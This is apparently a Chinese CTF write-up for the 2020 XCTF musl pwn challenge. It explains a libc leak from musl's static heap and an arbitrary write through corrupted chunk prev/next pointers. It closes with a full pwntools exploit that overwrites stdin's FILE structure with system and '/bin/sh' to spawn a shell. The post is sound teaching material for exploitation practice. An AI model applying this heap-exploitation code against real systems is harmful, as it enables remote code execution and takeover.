---
layout: post
title: "2020 xctf musl wp"
date:   2022-4-26
tags: [ctf_wp]
comments: true
author: wsxk
---

- [拿到libc地址](#拿到libc地址)
- [任意地址写](#任意地址写)
- [exp](#exp)




做的第一道musl pwn题

只能说虽然看起来很简单，其实还是挺困难的

不懂musl的可以看一看源码（

或者直接路由到我的源码分析
[musl1.1.24源码分析](https://wsxk.github.io/musl%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/)

直接看题目

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-4-26-XCTF_PWN_musl/1.png)

case 1 函数里面有且只有一个溢出机会

case 4 有且只有一个打印内容的机会


## 拿到libc地址

因为musl是静态堆内存（即它的初始堆就是在libc里的，所以你拿到了chunk的地址=拿到了libc的基址）

一开始申请一个0x20大小的chunk，根据musl的规律，它会从大chunk中切掉一部分（其中会保护mal某个位置的地址

## 任意地址写

任意地址写要用case1的溢出机会拿到

可以再申请3个0x20的chunk

free掉两个（不要连在一起，连在一起会自动合并），再申请第一个chunk

然后用case 1的覆写机会写后面chunk的地址（因为musl1.1.24基本不会对prev和next的合法性做检查，而且先进先出）

这时候可以把这个chunk的prev和next都改掉，这样mal.bins[0]会永远指向这个chunk（可以有任意地址写入的权限


## exp

    from pwn import *
    context.log_level='debug'

    io=process("./carbon")
    libc = ELF('./libc.so')

    def add(size,content,hello='N'):
        print("hello:"+hello)
        io.sendlineafter("> ",str(1))
        io.sendlineafter("What is your prefer size? >",str(size))
        io.sendlineafter("Are you a believer? >",hello)
        io.sendlineafter("Say hello to your new sleeve >",content)

    def delete(idx):
        io.sendlineafter("> ",str(2))
        io.sendlineafter("What is your sleeve ID? >",str(idx))

    def edit(idx,content):
        io.sendlineafter("> ",str(3))
        io.sendlineafter("What is your sleeve ID? >",str(idx))
        io.send(content)

    def examine(idx):
        io.sendlineafter("> ",str(4))
        io.sendlineafter("What is your sleeve ID? >",str(idx))

    # get libc_address
    #gdb.attach(io)
    add(0,'a') #0
    #gdb.attach(io)
    examine(0)

    libc_base = u64(io.recv(6).ljust(8,b'\x00'))-912-0xA0A80
    print(hex(libc_base))
    print("mal address: "+hex(libc_base+0xa0a80))
    libc.address=libc_base
    #gdb.attach(io)
    stdin = libc.address+0xA01C0
    brk = libc.address+0xA2FF0
    binmap = libc.address+0xA0A80
    bin  = libc.address + 0xA0A80+0x380
    system = libc.address+0x046BDA
    #gdb.attach(io)

    # procedure 2
    add(0x10,'a'*0xf)#1
    add(0x10,'b'*0xf)#2
    add(0x10,'c'*0xf)#3
    add(0x10,'d'*0xf)#4
    #gdb.attach(io)
    add(0x10,'e'*0xf) #5
    add(0x10,'f'*0xf) #6
    add(0x10,'g'*0xf) #7
    add(0x10,'h'*0xf) #8
    delete(1)
    delete(3)
    #gdb.attach(io)

    payload = b'i'*0x10+p64(0x21)*2+b'i'*0x10+p64(0x21)+p64(0x20)+p64(stdin-0x10)*2+p8(0x20) # set same but binmap is 0
    add(0x10,payload,hello='Y') #1
    add(0x10,b'\n') #3   bins[0] always point to #3
    #gdb.attach(io)

    delete(1)
    edit(3, p64(binmap - 0x20) * 2)
    add(0x10,b'\n')             #1
    delete(5) # set as non-empty bin

    edit(3, p64(brk - 0x10) * 2)
    add(0x10,b'\n')             #5
    delete(7) # set as non-empty bin

    edit(3,p64(bin-0x10)+p64(stdin-0x10))
    add(0x10,b'\n') 
    add(0x50,b'\n')#9
    edit(3,p64(bin-0x10)+p64(brk-0x10))
    add(0x10,b'\n')#10
    add(0x50,b'\n')#11
    edit(3,p64(bin-0x10)+p64(binmap-0x20))
    add(0x10,b'\n')#12
    add(0x50,b'\n')#13

    payload  = b"/bin/sh\x00"    # stdin->flags
    payload += b'X' * 0x20
    payload += p64(0xdeadbeef)  # stdin->wpos
    payload += b'X' * 8
    payload += p64(0xbeefdead)  # stdin->wbase
    payload += b'X' * 8
    payload += p64(system)      # stdin->write
    edit(9,payload)
    edit(11,p64(0xbadbeef - 0x20)+b'\n' )
    edit(13, b'X' * 0x10 + p64(0) + b'\n') 

    io.sendlineafter(">", '1')
    io.sendlineafter("What is your prefer size? >", '0')
    #gdb.attach(io)
    io.interactive()


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>
